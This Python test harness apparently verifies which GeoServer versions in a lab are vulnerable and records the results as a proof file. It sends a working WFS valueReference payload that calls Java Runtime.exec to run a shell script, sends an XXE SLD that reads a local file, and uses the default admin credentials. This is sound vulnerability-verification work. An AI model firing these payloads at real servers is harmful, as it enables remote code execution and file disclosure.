"""Small independent controls. Execution requires a separately granted project."""
import base64
import json
import os
from pathlib import Path
import secrets
import sys
import time
import urllib.parse
import xml.etree.ElementTree as ET

sys.dont_write_bytecode = True
from native_adapter import NativeGeoServer


def main():
    role = os.environ['GEOSERVER_PROFILE']
    version = {'2251': '2.25.1', '2252': '2.25.2', '2256': '2.25.6'}[role]
    client = NativeGeoServer(json.loads(Path(os.environ['MODULE_TARGET_RUNTIME']).read_text()))
    auth = ('admin', 'geoserver')
    status, body = client.request('/app/rest/about/version.json', auth=auth)
    resources = json.loads(body)['about']['resource']
    actual = next(item['Version'] for item in resources if item['@name'] == 'GeoServer')
    assert status == 200 and actual == version, (status, actual)
    identity = client.cli('app', 'id')['stdout']
    java = client.cli('app', 'java', '-version')
    jars = client.cli('app', 'sh', '-c', 'sha256sum "$GEOSERVER_LIB_DIR"/gs-main-*.jar "$GEOSERVER_LIB_DIR"/gt-complex-*.jar')['stdout']
    process = client.cli('app', 'ps', '-eo', 'pid,args')['stdout']
    assert '-Xmx512m' in process and '-XX:ActiveProcessorCount=1' in process

    # This is an ordinary supported WFS setting, not a changed vulnerability JAR.
    status, _ = client.request('/app/rest/services/wfs/settings', b'<wfs><maxFeatures>1</maxFeatures></wfs>', auth=auth, method='PUT')
    assert status == 200
    status, body = client.request('/app/rest/services/wfs/settings.json', auth=auth)
    assert status == 200 and json.loads(body)['wfs']['maxFeatures'] == 1
    query = urllib.parse.urlencode({'service': 'WFS', 'version': '2.0.0', 'request': 'GetFeature', 'typeNames': 'topp:states', 'outputFormat': 'application/json'})
    status, body = client.request('/app/wfs?' + query)
    features = json.loads(body)
    assert status == 200 and features['type'] == 'FeatureCollection' and len(features['features']) == 1
    query = urllib.parse.urlencode({'service': 'WMS', 'version': '1.1.1', 'request': 'GetMap', 'layers': 'topp:states', 'styles': '', 'srs': 'EPSG:4326', 'bbox': '-130,24,-66,50', 'width': 64, 'height': 64, 'format': 'image/png'})
    status, body = client.request('/app/wms?' + query)
    assert status == 200 and body.startswith(b'\x89PNG\r\n\x1a\n')
    if role == '2251':
        for credentials, expected in [(auth, 200), (('admin', 'wrong'), 401)]:
            status, _ = client.request('/auth/geoserver/wfs?service=WFS&request=GetCapabilities', auth=credentials)
            assert status == expected
        status, _ = client.request('/unrelated/index.html')
        assert status == 200

    token = secrets.token_hex(6)
    marker = '/tmp/module-target-geoserver-native-' + token
    script = '/tmp/module-target-geoserver-script-' + token
    text_path = '/tmp/module-target-geoserver-text-' + token
    empty_path = '/tmp/module-target-geoserver-empty-' + token
    text = ('GeoServer native: ' + token + '\nSecond line with spaces').encode()
    client.cli('app', 'test', '!', '-e', marker)
    # Ordinary CLI creates an independent append producer. Multiple evaluations
    # are observable; maxFeatures alone does not promise exactly-once execution.
    client.cli('app', 'sh', '-c', 'printf %s ' + base64.b64encode(('printf x >> ' + marker + '\n').encode()).decode() + ' | base64 -d > ' + script)
    # Independent literal command/handwritten WFS; no Framework payload renderer.
    xml = ("<wfs:GetPropertyValue service='WFS' version='2.0.0' xmlns:wfs='http://www.opengis.net/wfs/2.0' xmlns:topp='http://www.openplans.org/topp'>"
           "<wfs:Query typeNames='topp:states'/><wfs:valueReference>"
           'exec(java.lang.Runtime.getRuntime(), "/bin/sh ' + script + '")'
           '</wfs:valueReference></wfs:GetPropertyValue>').encode()
    rce_status, _ = client.request('/app/wfs', xml)
    deadline = time.monotonic() + 5
    while True:
        exists = client.cli('app', 'test', '-f', marker, check=False)['exitstatus'] == 0
        if exists or time.monotonic() >= deadline:
            break
        time.sleep(0.1)
    assert exists == (role == '2251'), (rce_status, exists)
    evaluations = 0
    if exists:
        observed = client.cli('app', 'cat', marker)['stdout']
        assert observed and set(observed) == {'x'}
        evaluations = len(observed)
        client.cli('app', 'rm', '--', marker)
    client.cli('app', 'rm', '--', script)
    client.cli('app', 'test', '!', '-e', marker)
    client.cli('app', 'sh', '-c', 'printf %s ' + base64.b64encode(text).decode() + ' | base64 -d > ' + text_path + '; : > ' + empty_path)
    assert client.cli('app', 'cat', text_path)['stdout'].encode() == text
    query = urllib.parse.urlencode({'service': 'WMS', 'version': '1.1.1', 'request': 'GetMap', 'width': 128, 'height': 128, 'format': 'image/png', 'bbox': '-130,24,-66,50'})
    xml = ('<?xml version="1.0"?><!DOCTYPE StyledLayerDescriptor [<!ENTITY native SYSTEM "file://' + text_path + '">]>'
           '<StyledLayerDescriptor version="1.0.0"><NamedLayer><Name>&native;</Name></NamedLayer></StyledLayerDescriptor>').encode()
    xxe_status, body = client.request('/app/wms?' + query, xml)
    document = ET.fromstring(body)
    disclosed = text.decode() in ''.join(document.itertext())
    assert disclosed == (role != '2256'), (xxe_status, body)
    proof = {'profile': role, 'version': actual, 'identity': identity, 'java': java, 'jars': jars, 'actual_processes': process,
             'native_rce': exists, 'native_xxe': disclosed, 'rce_status': rce_status, 'xxe_status': xxe_status, 'native_marker_window_seconds': 5,
             'text_path': text_path, 'empty_path': empty_path, 'text_base64': base64.b64encode(text).decode(),
             'feature_count': len(features['features']), 'native_wfs_append_evaluations': evaluations,
             'multiplicity_scope': 'This actual native request only; no exactly-once or session claims',
             'counts': {'commands': len(client.commands), 'requests': len(client.requests)}}
    client.artifacts.joinpath('native-geoserver-proof.json').write_text(json.dumps(proof, indent=2))
    print(json.dumps(proof))


if __name__ == '__main__':
    main()
